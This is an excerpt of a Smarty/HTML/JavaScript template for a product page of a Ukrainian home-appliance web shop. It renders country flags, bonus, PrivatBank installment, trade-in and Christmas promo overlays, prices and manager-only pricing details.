    document.getElementsByClassName('black_friday')[0].style.zIndex = "3";
}
    function show_icons_best_price()
{
if(document.getElementsByClassName('trdein_icon')[0])
    document.getElementsByClassName('trdein_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('black_friday')[0])
    document.getElementsByClassName('black_friday')[0].style.zIndex = "4";
}

    function hide_icons_trade_in()
{
if(document.getElementsByClassName('bonus_on_card')[0])
    document.getElementsByClassName('bonus_on_card')[0].style.zIndex = "0";

if(document.getElementsByClassName('oplata_chast_icon')[0])
    document.getElementsByClassName('oplata_chast_icon')[0].style.zIndex = "0";

if(document.getElementsByClassName('oplata_rassrochka_icon')[0])
    document.getElementsByClassName('oplata_rassrochka_icon')[0].style.zIndex = "0";

if(document.getElementsByClassName('waranty_zirtal')[0])
    document.getElementsByClassName('waranty_zirtal')[0].style.zIndex = "0";

if(document.getElementsByClassName('best_price_icon')[0])
    document.getElementsByClassName('best_price_icon')[0].style.zIndex = "0";

if(document.getElementsByClassName('black_friday')[0])
    document.getElementsByClassName('black_friday')[0].style.zIndex = "0";
}
    function show_icons_trade_in()
{
if(document.getElementsByClassName('bonus_on_card')[0])
    document.getElementsByClassName('bonus_on_card')[0].style.zIndex = "4";

if(document.getElementsByClassName('oplata_chast_icon')[0])
    document.getElementsByClassName('oplata_chast_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('oplata_rassrochka_icon')[0])
    document.getElementsByClassName('oplata_rassrochka_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('waranty_zirtal')[0])
    document.getElementsByClassName('waranty_zirtal')[0].style.zIndex = "4";

if(document.getElementsByClassName('best_price_icon')[0])
    document.getElementsByClassName('best_price_icon')[0].style.zIndex = "4";

if(document.getElementsByClassName('black_friday')[0])
    document.getElementsByClassName('black_friday')[0].style.zIndex = "4";
}
</script>
{/literal}
    {assign var="margin_top_icon" value=0}
    {if $item.bonus_amount<=0}{assign var="margin_top_icon" value=$margin_top_icon-35}{/if}
    {if $margin_top_icon==0}
<div style="
    display: block;
    position: absolute;">
    {else}
<div style="
    display: block;
    position: absolute;
    margin-top: {$margin_top_icon}px;">
    {/if}

{if $item.country}
                        {if $item.country == 'Германия' || $item.country == 'Німеччина' || $item.country == 'Germany' || $item.country == 'германия' || $item.country == 'німеччина' || $item.country == 'germany'}
         <div class="country_icon"><img src="/images/icons/flags/Germany.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Germany</span></div>
                        {/if}
                        {if $item.country == 'Италия' || $item.country == 'Італія' || $item.country == 'Italy' || $item.country == 'italia' || $item.country == 'Italia' || $item.country == 'италия' || $item.country == 'італія' || $item.country == 'italy'}
         <div class="country_icon"><img src="/images/icons/flags/Italy.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Italy</span></div>
                        {/if}
                        {if $item.country == 'Словения' || $item.country == 'Словенія' || $item.country == 'Slovenia' || $item.country == 'словения' || $item.country == 'словенія' || $item.country == 'slovenia'}
             <div class="country_icon"><img src="/images/icons/flags/Slovenia.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Slovenia</span></div>
                        {/if}
                        {if $item.country == 'Словакия' || $item.country == 'словакия' || $item.country == 'Словаччина' || $item.country == 'словаччина' || $item.country == 'slovakia' || $item.country == 'Slovakia'}
             <div class="country_icon"><img src="/images/icons/flags/Slovakia.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Slovakia</span></div>
                        {/if}
                        {if $item.country == 'Украина' || $item.country == 'Україна' || $item.country == 'Ukraine' || $item.country == 'украина' || $item.country == 'україна' || $item.country == 'ukraine'}
             <div class="country_icon"><img src="/images/icons/flags/Ukraine.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Ukraine</span></div>
                        {/if}
                        {if $item.country == 'Франция' || $item.country == 'Франція' || $item.country == 'France' || $item.country == 'франция' || $item.country == 'франція' || $item.country == 'france'}
         <div class="country_icon"><img src="/images/icons/flags/France.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">France</span></div>
                        {/if}
                        {if $item.country == 'Польша' || $item.country == 'Польща' || $item.country == 'Poland' || $item.country == 'польша' || $item.country == 'польща' || $item.country == 'poland'}
         <div class="country_icon"><img src="/images/icons/flags/Poland.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Poland</span></div>
                        {/if}
                        {if $item.country == 'Сербия' || $item.country == 'Сербія' || $item.country == 'Serbia' || $item.country == 'сербия' || $item.country == 'сербія' || $item.country == 'serbia'}
         <div class="country_icon"><img src="/images/icons/flags/Serbia.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Serbia</span></div>
                        {/if}
                        {if $item.country == 'Турция' || $item.country == 'Турція' || $item.country == 'Turkey' || $item.country == 'турция' || $item.country == 'турція' || $item.country == 'turkey'}
         <div class="country_icon"><img src="/images/icons/flags/Turkey.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Turkey</span></div>
                        {/if}
                        {if $item.country == 'Литва' || $item.country == 'Lithuania' || $item.country == 'литва' || $item.country == 'lithuania'}
             <div class="country_icon"><img src="/images/icons/flags/Lithuania.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Lithuania</span></div>
                        {/if}
                        {if $item.country == 'Таиланд' || $item.country == 'Таїланд' || $item.country == 'Thailand' || $item.country == 'таиланд' || $item.country == 'таїланд' || $item.country == 'thailand'}
             <div class="country_icon"><img src="/images/icons/flags/Thailand.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Thailand</span></div>
                        {/if}
                        {if $item.country == 'Венгрия' || $item.country == 'Угорщина' || $item.country == 'Hungary' || $item.country == 'венгрия' || $item.country == 'угорщина' || $item.country == 'hungary'}
             <div class="country_icon"><img src="/images/icons/flags/Hungary.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Hungary</span></div>
                        {/if}
                        {if $item.country == 'Румыния' || $item.country == 'Румунія' || $item.country == 'Romania' || $item.country == 'румыния' || $item.country == 'румунія' || $item.country == 'romania'}
             <div class="country_icon"><img src="/images/icons/flags/Romania.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Romania</span></div>
                        {/if}
                        {if $item.country == 'Белоруссия' || $item.country == 'Белорусь' || $item.country == 'Білорусь' || $item.country == 'Belarus' || $item.country == 'белоруссия' || $item.country == 'белорусь' || $item.country == 'білорусь' || $item.country == 'belarus'}
             <div class="country_icon"><img src="/images/icons/flags/Belarus.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Belarus</span></div>
                        {/if}
                        {if $item.country == 'Португалия' || $item.country == 'Португалія' || $item.country == 'Portugal' || $item.country == 'португалия' || $item.country == 'португалія' || $item.country == 'portugal'}
             <div class="country_icon"><img src="/images/icons/flags/Portugal.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Portugal</span></div>
                        {/if}
                        {if $item.country == 'Болгария' || $item.country == 'Болгарія' || $item.country == 'Bulgaria' || $item.country == 'болгария' || $item.country == 'болгарія' || $item.country == 'bulgaria'}
             <div class="country_icon"><img src="/images/icons/flags/Bulgaria.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Bulgaria</span></div>
                        {/if}
                        {if $item.country == 'Великобритания' || $item.country == 'Великобританія' || $item.country == 'United Kingdom' || $item.country == 'великобритания' || $item.country == 'великобританія' || $item.country == 'united kingdom'}
                 <div class="country_icon"><img src="/images/icons/flags/United-Kingdom.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">UK</span></div>
                        {/if}
                        {if $item.country == 'Южная Корея' || $item.country == 'Південна Корея' || $item.country == 'South Korea' || $item.country == 'южная корея' || $item.country == 'південна корея' || $item.country == 'south korea'}
                 <div class="country_icon"><img src="/images/icons/flags/South-Korea.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Korea</span></div>
                        {/if}
                        {if $item.country == 'Дания' || $item.country == 'Данія' || $item.country == 'Denmark' || $item.country == 'дания' || $item.country == 'данія' || $item.country == 'denmark'}
             <div class="country_icon"><img src="/images/icons/flags/Denmark.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Denmark</span></div>
                        {/if}
                        {if $item.country == 'Хорватия' || $item.country == 'Хорватія' || $item.country == 'Croatia' || $item.country == 'хорватия' || $item.country == 'хорватія' || $item.country == 'croatia'}
             <div class="country_icon"><img src="/images/icons/flags/Croatia.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Croatia</span></div>
                        {/if}
                        {if $item.country == 'Россия' || $item.country == 'Росія' || $item.country == 'Russia' || $item.country == 'россия' || $item.country == 'росія' || $item.country == 'russia'}
             <div class="country_icon"><img src="/images/icons/flags/Russia.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">Russia</span></div>
                        {/if}
                        {if $item.country == 'Китай' || $item.country == 'КНР' || $item.country == 'China' || $item.country == 'CNR' || $item.country == 'Китайская Народная Республика' || $item.country == 'Китайська Народна Республіка' || $item.country == 'Republic of China' || $item.country == 'китай' || $item.country == 'кнр' || $item.country == 'china' || $item.country == 'cnr' || $item.country == 'китайская народная республика' || $item.country == 'китайська народна республіка' || $item.country == 'republic of china'}
         <div class="country_icon"><img src="/images/icons/flags/China.png" style="position: absolute;margin-left: -29px;margin-top: 1px;width: 25px;">made in<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">China</span></div>
                        {/if}
                    {/if}

{if $item.bonus_amount>0}<div onmouseover="hide_icons_bonus()" onmouseout="show_icons_bonus()" class="bonus_on_card"><img src="/images/hint/piggy-bank.png" style="position: absolute;margin-left: -29px;margin-top: 1px;">вернем<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">{$item.bonus_amount|round} грн.</span><div class="overlay_icons" style="margin-top: -30px;margin-left: -145px;font-style: italic;">
    <div class="wrapper_body"><div class="cbm_wrap ">
     <a href="https://590.ua/news/%D0%BC%D0%B5%D0%BD%D1%8F%D0%B9%D1%82%D0%B5-%D0%B1%D0%BE%D0%BD%D1%83%D1%81%D1%8B-%D0%BD%D0%B0-%D1%82%D0%B5%D1%85%D0%BD%D0%B8%D0%BA%D1%83" target="_blank"><h1 title="Узнать подробнее...">Оплачивай бонусами</h1></a>
     <a href="https://590.ua/news/%D0%BC%D0%B5%D0%BD%D1%8F%D0%B9%D1%82%D0%B5-%D0%B1%D0%BE%D0%BD%D1%83%D1%81%D1%8B-%D0%BD%D0%B0-%D1%82%D0%B5%D1%85%D0%BD%D0%B8%D0%BA%D1%83" target="_blank"><img title="Узнать подробнее..." src="/images/hint/bonus.jpg"></a>
     <p>Вы можете получить бонусную карточку на которой можно накапливать и тратить бонусы в оплате товара на нашем сайте (1 бонус приравнивается к 1 грн.)<br><br>Бонусный счет можно использовать для полной или частичной оплаты последующих заказов в нашем интернет-магазине.<br><br>Карточку постоянного покупателя могут использовать все члены Вашей семьи, а также друзья.</p></div>
</div></div></div>{/if}

{if $item.rent > 25}{assign var="rent_index" value=8}{elseif $item.rent > 12.5}{assign var="rent_index" value=6}{else}{assign var="rent_index" value=3}{/if}

    {if $item.id_availability == 1}
    <div onmouseover="hide_icons_oplata_chast()" onmouseout="show_icons_oplata_chast()" class="oplata_chast_icon">
        <img src="/images/icons/privatbank_pp_{if $item.rent >= 25}8{elseif $item.rent > 12.5}6{elseif $item.rent > 7.5}3{else}3{/if}_logo.png"
             style="position: absolute;margin-left: -33px;width: 27px;margin-top: -1px;">
        от <span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">{$item.price/$rent_index*$curs_evro_smarty|round}</span><br><span
                style="font-size: 10px;font-weight: bold;font-style: italic;"> грн./мес.</span>
        <div class="overlay_icons" style="margin-top: -30px;margin-left: -145px;font-style: italic;">
    <div class="wrapper_body"><div class="cbm_wrap ">
     <noindex><a href="https://chast.privatbank.ua/" rel="nofollow" target="_blank"><h1 title="Узнать подробнее...">Оплата частями</h1></a></noindex>
     <noindex><a href="https://chast.privatbank.ua/" rel="nofollow" target="_blank"><img title="Узнать подробнее..." src="/images/hint/op_chast.png"></a></noindex>
     <span style="margin-top: 10px;display: block;font-weight: bold;font-size: 13px;">Этот товар Вы сможете оплатить частями. Без переплат!</span><br>
     <span style="font-size: 13px;font-weight: bold;margin-left: -120px;display: block;margin-bottom: 5px;">Все что Вам нужно:</span>
     <span style="font-size: 13px;font-weight: bold;margin-left: -100px;display: block;">1. Наличие карты ПриватБанк.</span>
     <noindex><a href="https://chast.privatbank.ua/" rel="nofollow" target="_blank"><img title="Узнать подробнее..." src="/images/hint/cardprivat.png"></a></noindex>
     <span style="font-size: 13px;font-weight: bold;margin-left: -165px;display: block;">2. Доступный лимит.</span>
     <span style="font-size: 12px;margin-left: 30px;display: block;">Узнать максимальную суму покупки по сервису очень просто. Нужно отправить SMS сообщение на номер 10060 с текстом chast</span>
     </div>
</div></div></div>

    <div onmouseover="hide_icons_oplata_rassrochka()" onmouseout="show_icons_oplata_rassrochka()"
         class="oplata_rassrochka_icon">
        <img src="/images/hint/oplata_rassrochka_icon.png"
             style="position: absolute;margin-left: -32px;margin-top: 1px;">от
        <span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">{$item.price*0.0099*$curs_evro_smarty+$item.price/24*$curs_evro_smarty|round}</span><br><span
                style="font-size: 10px;font-weight: bold;font-style: italic;"> грн./мес.</span>
        <div class="overlay_icons" style="margin-top: -30px;margin-left: -145px;font-style: italic;">
    <div class="wrapper_body"><div class="cbm_wrap ">
     <noindex><a href="https://chast.privatbank.ua/" rel="nofollow" target="_blank"><h1 title="Узнать подробнее...">МГНОВЕННАЯ РАССРОЧКА</h1></a></noindex>
     <noindex><a href="https://chast.privatbank.ua/" rel="nofollow" target="_blank"><img title="Узнать подробнее..." src="/images/hint/oplata_rassrochka.jpg"></a></noindex>
     <p>Покупайте товары в рассрочку до 24 месяцев с небольшой ежемесячной комиссией от стоимости товара.</p>
     </div>
</div></div></div>
{/if}

{if $item.id_brand == '26' && $item.id_category != 60}
<div class="waranty_zirtal"><img src="/images/hint/waranty_zirtal.png" style="position: absolute;margin-left: -26px;margin-top: 1px;">гарантия<br><span style="color: rgba(255, 39, 2, 0.81);font-weight: bold;font-size: 10px;font-style: italic;">36 мес.</span></div>
{/if}

{if $item.bestprice > $item.price || $item.id2==41385}
<div onmouseover="hide_icons_best_price()" onmouseout="show_icons_best_price()" class="best_price_icon"><img src="/images/hint/thumbs_up.png" style="position: absolute;margin-left: -29px;margin-top: 1px;">лучшая<br><span style="font-weight: bold;font-size: 10px;font-style: italic;">цена</span><div class="overlay_icons" style="margin-top: -30px;margin-left: -145px;font-style: italic;">
    <div class="wrapper_body"><div class="cbm_wrap ">
     <h1>Отличный выбор</h1>
     <img src="/images/hint/best_price.jpg">
     <p>Мы отследили цены во многих интернет магазинах по этому товару. И смело можем утверждать, что наша цена является лучшей!<br>Товары, на которых Вы заметили иконку с пальцем вверх - достойны Вашего внимания :)</p>
     </div>
</div></div></div>
{/if}
</div>
{if $item.acttype !== 'gift'&& $x3 > 0 || $item.id == '21465'}
<div onmouseover="hide_icons_trade_in()" onmouseout="show_icons_trade_in()" class="trdein_icon"><img src="/images/icons/zamena_catalog.png" style="position: absolute;margin-left: -29px;margin-top: 1px;"><div class="overlay_icons" style="margin-top: -460px;margin-left: -201px;font-style: italic;">
    <div class="wrapper_body"><div class="cbm_wrap ">
     <noindex><a href="https://590.ua/articles/zamena" rel="nofollow" target="_blank"><h1 title="Узнать подробнее...">Замена (Trade-in)</h1></a></noindex>
     <noindex><a href="https://590.ua/articles/zamena" rel="nofollow" target="_blank"><img title="Узнать подробнее..." src="/images/hint/tradein_description.jpg"></a></noindex>
     <p>Вы имеете следующую выгоду:<br>1. Весомая скидка на технику<br>2. Бесплатная доставка в квартиру<br>3. Бесплатное подключение<br>4. Вывоз и утилизация старой техники<br><br>Все это, в течении короткого времени мы сделаем сами, тем самым освободив Вас от хлопот и дополнительных финансовых расходов.</p>
     </div>
</div></div></div>
{/if}

{if ($login=='акция рождество' || $login=='Гальченко Владимир') && $item_id_temporary_celebration}
{assign var="iteration_celebration" value=0}
{foreach from=$item_id_temporary_celebration item=foo}
   {if $item.id == $foo && $item.acttype!='gift'}
   <div onmouseover="hide_icons_black_friday()" onmouseout="show_icons_black_friday()" class="black_friday grow-rotate"><img class="pulse" src="/images/hint/black.png" style="position: absolute;margin-left: -29px;margin-top: 1px;"><div style="
    color: #4aaa20;
    position: absolute;
    margin-top: 48px;
    margin-left: 4px;
    font-size: 12px;
    transform: rotate(-6deg);
    font-weight: bold;
    font-family: sans-serif;
    width: 80px;
    text-align: center;
">{$summ_temporary_celebration[$iteration_celebration]} грн.</div><div class="overlay_icons" style="margin-top: 60px;margin-left: -128px;font-style: italic;">
    <div class="wrapper_body"><div class="cbm_wrap ">
     <noindex><a href="https://goo.gl/4CLd9k" rel="nofollow" target="_blank" title="Показать все товары со скидками"><h1>Christmas</h1></a></noindex>
     <noindex><a href="https://goo.gl/4CLd9k" rel="nofollow" target="_blank" title="Показать все товары со скидками"><img src="/images/hint/black_friday.jpg"></a></noindex>
     <p>Рождество - это тихий, семейный праздник, который стоит провести в кругу самых близких людей! Мы поздравляем всех наших клиентов с этим светлым праздником и дарим в честь него подборку товаров с большими скидками.<br><strong style="font-size: 11px; line-height: 11px;">Внимание: в акции не участвуют комплекты вместе дешевле. Акционные товары возможно оплатить: наличными, картой, безналичным переводом. Оплата частями от Приват Банка не распространяется на акционные товары.</strong></p>
     </div>
</div></div></div>
{/if}
{assign var="iteration_celebration" value=$iteration_celebration+1}
{/foreach}{/if}
{/if}

                   <!-- // main_photo -->

                    {if $item.id_availability == 1}
                    <!-- Credit Logo -->
                        <div class="credit_logo_privatbank_pp" style="display: none;">
                            <img src="/images/icons/privatbank_pp_{if $item.rent >= 25}8{elseif $item.rent > 12.5}6{elseif $item.rent > 7.5}3{else}3{/if}_logo.png" width="60" title="Для 'Оплаты Частями' необходимо купить товар на сайте с помощью кнопки 'Купить'. Далее: в корзине сайта, при оформлении заказа, выбрать условия оплаты." alt="Кредит Оплата Частями Приватбанк" rel="tooltip" data-original-title="Для 'Оплаты Частями' необходимо купить товар на сайте с помощью кнопки 'Купить'. Далее: в корзине сайта, при оформлении заказа, выбрать условия оплаты.">
                        </div>
                        <div class="credit_logo_privatbank_ip" style="display: none;">
                            <img src="/images/icons/privatbank_ip_24_logo.png" width="60" title="Для оплаты 'Мгновенной Рассрочкой' необходимо купить товар на сайте с помощью кнопки 'Купить'. Далее: в корзине сайта, при оформлении заказа, выбрать условия оплаты." alt="Кредит Мгновенная Рассрочка Приватбанк" rel="tooltip" data-original-title="Для оплаты 'Мгновенной Рассрочкой' необходимо купить товар на сайте с помощью кнопки 'Купить'. Далее: в корзине сайта, при оформлении заказа, выбрать условия оплаты.">
                        </div>
                        <div class="bonusplus_logo_privatbank" style="display: none;">
                            <img src="/images/icons/privatbank_bonusplus_logo.png" width="60" title="Покупателям, оплатившим товар с помощью карточки ПриватБанка, зачисляется 'Бонус Плюс 5%'" alt="Бонус Плюс Приватбанк" rel="tooltip" data-original-title="Покупателям, оплатившим товар с помощью карточки ПриватБанка, зачисляется 'Бонус Плюс 5%'">
                        </div>
                        <div class="discount_club_privatbank" style="display: none;">
                            <img src="/images/icons/item/privatbank-discount-club-60x60.png" title="Скидкой по программе Дисконтный клуб могут воспользоваться только владельцы карт ПриватБанка уровня  Gold,Platinum или Infinite.
Скидка предоставляется в момент оплаты картами по сервису LiqPay.com" alt="Дисконтній клуб Плюс Приватбанк" rel="tooltip" data-original-title="Скидкой по программе Дисконтный клуб могут воспользоваться только владельцы карт ПриватБанка уровня  Gold,Platinum или Infinite.
Скидка предоставляется в момент оплаты картами по сервису LiqPay.com">
                        </div>
                    <!-- Credit Logo End -->
                    {/if}

                    {if in_array($item.id_category, array(26, 25, 209, 102, 18, 24, 212, 37, 314, 21, 36, 12, 16, 88, 210, 211, 175, 10, 15, 155, 39, 213, 11, 13, 34, 302, 67))}
                        {if $item.acttype !== 'gift'&& $x3 > 0 || $item.id == '21465'}
                            <!-- Zamena Logo -->
                            <div class="zamena" style="display: none;">
                                <a href="/articles/zamena">
                                    <img src="/images/icons/zamena-item.png" rel="tooltip" data-original-title="При покупке техники по системе Trade-in, Вы имеете выгоду в: 1) Весомая скидка на технику; 2) Бесплатная доставка в квартиру; 3) Бесплатное подключение; 4) Вывоз и утилизация старой техники. Все ето, в течении короткого времени мы сделаем сами, тем самым освободив Вас от хлопот и дополнительных финансовых расходов.">
                                </a>
                            </div>
                            <!-- Zamena Logo End -->
                        {/if}
                    {/if}

                    <div class="one_item_prev_imgs">
                    {if $login == 'Vitaliy Shyshko' && $item.images}
                        {foreach from=$item.images item=item_image name=item_image}
                            {if !$smarty.foreach.item_image.first}
                                <a rel="prettyPhoto[pp]" href="{$url.img}/catalog/{$item_image.id}.{$item_image.imgext}" title="{$item_image.brand} {$item_image.name}">
                                    <img itemprop="image" {if $item_image.id}src="{$url.img}/catalog/{$item_image.id}_s.{$item_image.imgext}"{else}src="{$url.img}/no-image.jpg"{/if} alt="{if $item.cat_onename}{$item.cat_onename|mblower}{else}{$item.cat|mblower}{/if} {$item.brand} {$item.name} купить" title="{if $item.cat_onename}{$item.cat_onename|mblower}{else}{$item.cat|mblower}{/if} {$item.brand} {$item.name}" />
                                </a>
                            {/if}
                        {/foreach}
                    {/if}
                    </div><!-- // one_item_prev_imgs -->
                </div><!-- // one_item_img_block -->
            </div><!-- // one_item_left -->
{if $login == 'Гальченко Владимир' || $login == 'Сергей Гринюк'}
{literal}
<style type="text/css">
	.one_item_price_block_full{
		height: 290px !important;
	}
</style>
{/literal}
{/if}
            <div class="one_item_right" data-id="{$item.id}">
                <div class="one_item_price_block{if !$action} one_item_price_block_full{/if}">
                    <div class="one_item_vblock_full {if !$item.rating}one_item_vblock_full_none_rate{/if}">
                        {if $item.rating}
                        <div class="one_item_rating" style="display: none;">
                            <p class="item-rate" itemprop="aggregateRating"   itemscope itemtype="http://schema.org/AggregateRating">
                                <meta content="{$item.rating|ceil}" itemprop="ratingValue" />
                                <span itemprop="ratingCount" style="display: none">{$item.rating}</span>
                                <input name="star1" value="{$item.rating|round}" type="radio" disabled="disabled" {if $item.rating >= 1}checked="checked"{/if} class="star-item"/>
                                <input name="star1" value="{$item.rating|round}" type="radio" disabled="disabled" class="star-item" {if $item.rating|ceil >= 2}checked="checked"{/if} />
                                <input name="star1" value="{$item.rating|round}" type="radio" class="star-item" disabled="disabled" {if $item.rating|ceil >= 3}checked="checked"{/if} />
                                <input name="star1" value="{$item.rating|round}" type="radio" disabled="disabled" class="star-item" {if $item.rating|ceil >= 4}checked="checked"{/if} />
                                <input name="star1" value="{$item.rating|round}" type="radio" disabled="disabled" class="star-item" {if $item.rating|ceil >= 5}checked="checked"{/if} />
                            </p>
                            {literal}
                                <script type="text/javascript">
                                    $(document).ready(function(){
                                    $('input.star-item').rating();
                                    });
                                </script>
                            {/literal}
                        </div><!-- // one_item_rating -->
                        {/if}

                        {if !($item.archive == 1 && $item.id_availability == 3) }
                            <span class="one_item_status">
                                <span class="item-stock">
                                    {if $item.id_availability == 1} <strong class="in-stock"><link itemprop="availability" href="http://schema.org/InStock">Есть в наличии</strong>
                                    {elseif $altItem.id_availability == 2 && $item.qrm>0} <a style="font-weight: bold;color: #0D8ABC;">Наличие уточняйте</a>
                                    {elseif $altItem.id_availability == 2 && $item.qrm==0 || $item.qrm==""} <a class="on-order" target="_blank" href="/articles/4" title="Как получить товар под заказ">Под заказ</a>
                                    {elseif $item.id_availability == 3} <a class="on-order" target="_blank" href="/articles/4" title="Как получить товар под заказ">Под заказ</a>
                                    {elseif $item.id_availability == 4} <strong class="in-stock">Есть в наличии, <br />доставку уточняйте.</strong>{else} <a style="font-weight: bold;color: #0D8ABC;">Наличие уточняйте</a>{/if}
                                </span>
                            </span>
                        {/if}
                    </div><!-- // one_item_vblock_full -->

                    <div class="one_item_vblock">
                    	{if $item.archive && $item.id_availability == 3}
                            <p>
                                <span class='strong'>
                                    <link itemprop="availability" href="http://schema.org/Discontinued">Товар снят с производства
                                </span>
                                <div style="font-size: 35px;
    margin-left: -4px;
    color: #0d8abc;" itemprop="offers" itemscope itemtype="http://schema.org/Offer">
                                    <span itemprop="price" style="display: none" >{price $item.price $item.id_currency}</span>
                                    <meta itemprop="priceCurrency" content="UAH" />
                                </div>
                            </p>
                    	{/if}

                        {if $item.newmodel_id}<p>Заменен моделью <a href="/catalog/item/{$item.newmodel_id}">{$item.newmodel_name}</a></p>{/if}

                        {if $item.specprice  && ($item.bdprice > $item.price) && ($item.bdprice - $item.price)/$item.price > 0.01}
                            <span>
                                <span class="one_item_old_price">
                                    <span class="prod_old_price" style="font-size: 23px;">{price $item.bdprice $item.id_currency} {$smarty.session.Currency.title}</span>
                                </span>
                                <span class="one_item_price">
                                    <span class="prod_price">{price $item.price $item.id_currency} {$smarty.session.Currency.title}</span>
                                </span>
                                <div style="font-size: 35px;
    margin-left: -4px;
    color: #0d8abc;" itemprop="offers" itemscope itemtype="http://schema.org/Offer">
                                    <meta itemprop="price" content="{price $item.price}" />
                                    <span><meta itemprop="priceCurrency" content="UAH" /></span>
                                </div>
                            </span>
                        {else}
                            <span class="one_item_price">
                                <div style="font-size: 35px;
    margin-left: -4px;
    color: #0d8abc;" itemprop="offers" itemscope itemtype="http://schema.org/Offer">
                                    <meta itemprop="price" content="{price $item.price}" />{price $item.price $item.id_currency}
                                    <meta itemprop="priceCurrency" content="UAH" />{$smarty.session.Currency.title}
                                </div>
                            </span>
                        {/if}

                        <div class="clear"></div>

                         <!-- {if $item.id_programm==3} <p class="manager-pr">Салонная программа</p>{/if}-->

                        {if $manager}
                          {if $item.rent}<p class="category-price">Категория цены {if $item.rent >= 25}1{elseif $item.rent > 12.5}2{elseif $item.rent > 7.5}3{else}3{/if}</p>{/if}
                        {/if}

                        {if $manager}
                            <div class="cat-manager-price">
                                <p>
                                {if $type_program == 'OR'}
                                    <strong style="padding: 5px 5px; background-color: #f8c278; color: #000; font-size: 11px;">Open Range</strong><br>
                                {elseif $type_program == 'PR'}
                                    <strong style="padding: 5px 5px; background-color: #f8c278; color: #000; font-size: 11px;">Protect Range</strong><br>
                                {elseif $type_program == 'PKR'}
                                    <strong style="padding: 5px 5px; background-color: #f8c278; color: #000; font-size: 11px;">Protect Kitchen Range</strong><br>
                                {else}
                                <strong style="padding: 5px 5px; background-color: #f8c278; color: #000; font-size: 11px;">{$type_program}</strong><br>
                                {/if}
                                  <span>РИЦ: {price $item.roznprice $item.id_currency} {$smarty.session.Currency.title}</span></p>
                                  {if $item.discount>=0}<p>Скидка: - {$item.discount}%</p>{else}<p>Наценка: + {math equation="x*y" x=$item.discount y=-1}%</p>{/if}
                                  {if $login == 'Гальченко Владимир'}<strong>Себестоимость: {if $item.cost==NULL}нет на складе{else}{$item.cost*$curs_evro_smarty}{/if}</strong><br>
                                  Курс евро: {$curs_evro_smarty}<br>
                                  переменная:<br>{$rgrgregewrgewr|var_dump}{/if}
                                <p>{$item.qrm}, {$item.qty_z}, {if $item.rqrm}{$item.rqrm}{else}-{/if}{if $login == 'Сергей Гринюк' || $login == 'ruslan'|| $login == 'Саша Ефимов' || $login == 'Vadyus' || $login == 'Vitaliy Shyshko' || $login == 'Гальченко Владимир'}{if $item.rent},({$item.rent}){/if},[{$item.sold}]{/if}</p>

